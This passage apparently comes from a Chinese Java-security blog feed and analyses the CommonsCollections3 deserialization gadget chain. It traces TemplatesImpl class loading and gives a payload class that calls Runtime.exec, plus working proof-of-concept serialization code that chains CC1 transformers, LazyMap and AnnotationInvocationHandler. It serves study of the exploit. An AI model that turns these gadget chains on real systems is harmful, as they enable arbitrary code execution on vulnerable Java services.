@matthias_kaiser</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></div>

<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/12/Java%E5%AE%89%E5%85%A8/CommonsCollection6%E5%88%A9%E7%94%A8%E9%93%BE/image-20231019194839328.png"
                      class="" title="image-20231019194839328"
                >

<h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><p>P牛知识星球-Java安全漫谈</p>
<p>B站-白日梦组长</p>
<p><a class="link"   href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&vd_source=19d2e433219440bcf5304fbe8a00b7ff" >https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=19d2e433219440bcf5304fbe8a00b7ff <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Y4tacker</p>
<p><a class="link"   href="https://github.com/Y4tacker/JavaSec" >https://github.com/Y4tacker/JavaSec <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections6</tag>
      </tags>
  </entry>
  <entry>
    <title>CommonsCollections3</title>
    <url>/2023/09/15/Java%E5%AE%89%E5%85%A8/CommonsCollection3%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>CC3这条链跟CC1和CC6不同的是，没有在链的代码中执行任意代码，<strong>而是通过动态类加载机制来实现自动执行恶意类的代码</strong></p>
<h1 id="0x01-利用链"><a href="#0x01-利用链" class="headerlink" title="0x01 利用链"></a>0x01 利用链</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></div>

<h1 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h1><h2 id="TemplatesImpl类加载实现任意代码执行"><a href="#TemplatesImpl类加载实现任意代码执行" class="headerlink" title="TemplatesImpl类加载实现任意代码执行"></a>TemplatesImpl类加载实现任意代码执行</h2><p><code>ysoserial</code>找到了 <strong>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</strong> </p>
<p>这个类中定义了一个内部类<strong>TransletClassLoader</strong>里面重写了**defineClass()**，并且这里没有显式地声明其定义域</p>
<p>Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<strong>default</strong>。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Class <span class="title function_">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="literal">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以找到在哪里调用了<strong>defineClass</strong>，可以看到在<strong>defineTransletClasses</strong>类的<strong>for</strong>循环中调用了，不过是私有的，内部会调用</p>
<p>可以看到依次加载字节码**_bytecodes<strong>中的内容，然后赋值给</strong>Class<strong>数组</strong>_class**</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>接着找可以发现在<strong>getTransletInstance</strong>中调用了<strong>defineTransletClasses</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="built_in">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="literal">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在将字节码加载进来后，会执行这个代码</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure></div>

<p>这样就可以实例化类，执行任意代码了</p>
<p>但是<strong>getTransletInstance</strong>依旧是<strong>private</strong>，所以接着找哪里调用了<strong>getTransletInstance</strong></p>
<p>找到<strong>newTransformer</strong>，而且是<strong>public</strong>修饰的，这样我们大概的利用链就找到了</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line">    <span class="keyword">if</span> (_uriResolver != <span class="literal">null</span>) &#123;</span><br><span class="line">        transformer.setURIResolver(_uriResolver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看一下当前的利用链是怎样的</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">	TemplatesImpl.getTransletInstance()</span><br><span class="line">		TemplatesImpl.defineTransletClasses()</span><br><span class="line">			TemplatesImpl.TransletClassLoader</span><br><span class="line">			TransletClassLoader.defineClass()</span><br></pre></td></tr></table></figure></div>

<h2 id="编写POC"><a href="#编写POC" class="headerlink" title="编写POC"></a>编写POC</h2><p>首先从<strong>newTransformer()<strong>中走到了</strong>getTransletInstance()</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException</span><br><span class="line">&#123;</span><br><span class="line">    TransformerImpl transformer;</span><br><span class="line">    transformer = <span class="keyword">new</span> <span class="title class_">TransformerImpl</span>(getTransletInstance(), _outputProperties,</span><br><span class="line">        _indentNumber, _tfactory);</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>getTransletInstance()<strong>中的</strong>_name</strong>不能为空</p>
<p>而**_class<strong>要为空才能走到</strong>defineTransletClasses()**</p>
<p>而且**TemplatesImpl()**是个无参构造，所以值我们可以自己赋</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TemplatesImpl</span><span class="params">()</span> &#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> Translet <span class="title function_">getTransletInstance</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="literal">null</span>) defineTransletClasses();</span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        <span class="type">AbstractTranslet</span> <span class="variable">translet</span> <span class="operator">=</span> (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>defineTransletClasses()<strong>中的</strong>_bytecodes</strong>和**_tfactory**</p>
<p><strong>_bytecodes</strong>为我们要加载的字节码，也就是也就是<strong>class</strong>文件</p>
<p><strong>_tfactory</strong>需要是一个<strong>TransformerFactoryImpl</strong>对象，因为**TemplatesImpl.defineTransletClasses() **方法里有调用到 <strong>_tfactory.getExternalExtensionsMap()<strong>，如果是</strong>null</strong>会出错。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[][] _bytecodes = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defineTransletClasses</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> TransformerConfigurationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (_bytecodes == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">classCount</span> <span class="operator">=</span> _bytecodes.length;</span><br><span class="line">        _class = <span class="keyword">new</span> <span class="title class_">Class</span>[classCount];</span><br><span class="line">        <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            _auxClasses = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">            _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Class</span> <span class="variable">superClass</span> <span class="operator">=</span> _class[i].getSuperclass();</span><br><span class="line">            <span class="comment">// Check if this is the main class</span></span><br><span class="line">            <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                _transletIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在往后走，**_auxClasses**不用赋值</p>
<p>但是这里会去判断我们要执行的字节码的父类是不是这个<strong>ABSTRACT_TRANSLET</strong></p>
<p>不是的话会将**_transletIndex<strong>赋值为</strong>-1<strong>，并且会报</strong>_auxClasses**空指针错误</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">    _transletIndex = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且后面有个<strong>if</strong>判断**_transletIndex<strong>是不是小于0，是的话会直接报错，所以给</strong>_transletIndex**赋值也没啥意义</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    ErrorMsg err= <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TransformerConfigurationException</span>(err.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>所以就是要进去第一个<strong>if</strong>判断里</p>
<p>看一下<strong>ABSTRACT_TRANSLET</strong>这个是什么，</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABSTRACT_TRANSLET</span></span><br><span class="line">    <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<p>也就是说我们要执行的字节码的父类要继承<strong>AbstractTranslet</strong></p>
<p>而这个也是<strong>TemplatesImpl</strong>类加载字节码的一个要求</p>
<p>所以我们要构造一个特殊类，继承了<strong>AbstractTranslet</strong>的执行类</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CalcTest</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CalcTest</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>到这里**defineTransletClasses()<strong>算是完成了，返回到</strong>getTransletInstance()<strong>中，下一步就会去触发</strong>newInstance()**，从而实现任意代码执行</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest01.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 newTransformer() 方法</span></span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure></div>

<h2 id="CC1-TemplatesImpl"><a href="#CC1-TemplatesImpl" class="headerlink" title="CC1+TemplatesImpl"></a>CC1+TemplatesImpl</h2><p>怎么去调用<strong>newTransformer</strong>？</p>
<p>想到<strong>CC1</strong>链的<strong>InvokerTransform</strong>类能够实现调用传进去的方法。</p>
<p>只需要更改<strong>CC1</strong>中的这部分代码，将<strong>exec</strong>改为**templates::newTransformer()**即可</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure></div>

<p>即为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="comment">//反射修改属性</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//获取字节码</span></span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"><span class="comment">//调用transform</span></span><br><span class="line">chainedTransformer.transform(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></div>



<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">nameFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameFiled.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\tmp\\classes\\CalcTest01.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryFiled</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryFiled.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">Transformer[] transformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformer);</span><br><span class="line"><span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">h</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, h);</span><br><span class="line"><span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class, mapProxy);</span><br><span class="line">serialize(o);</span><br><span class="line">unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h2 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h2><p>可以看到在<strong>ysoserial</strong>上使用的是<strong>TrAXFilter</strong>这个类，在这个类中直接传入<strong>Templates</strong>类型的对象</p>
<p>并且调用了**(TransformerImpl) templates.newTransformer()**</p>
<p>免去我们利用<strong>InvokerTransformer</strong>⼿⼯调⽤<strong>newTransformer</strong>方法</p>
<p>但是这个类不能进行序列化，所以需要利用它的<strong>class</strong>，并且利用构造函数赋值</p>
